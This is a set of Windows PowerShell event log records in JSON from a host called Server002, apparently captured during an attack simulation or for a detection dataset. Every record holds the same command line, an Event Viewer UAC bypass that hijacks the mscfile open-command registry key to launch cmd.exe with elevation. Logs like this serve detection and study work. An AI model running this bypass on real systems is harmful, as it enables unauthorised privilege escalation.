{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:30:04.4857593"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=05960b4a-a0e0-499e-84dd-8e9097d32a30\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:30:04.5292489"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=05960b4a-a0e0-499e-84dd-8e9097d32a30\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:30:04.5292489"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=05960b4a-a0e0-499e-84dd-8e9097d32a30\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:30:04.5292489"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=05960b4a-a0e0-499e-84dd-8e9097d32a30\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:30:04.5292489"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=05960b4a-a0e0-499e-84dd-8e9097d32a30\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:30:04.5292489"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=05960b4a-a0e0-499e-84dd-8e9097d32a30\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:30:04.8396628"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=05960b4a-a0e0-499e-84dd-8e9097d32a30\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=34caa4b3-5316-4173-ae10-4e94145545e8\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
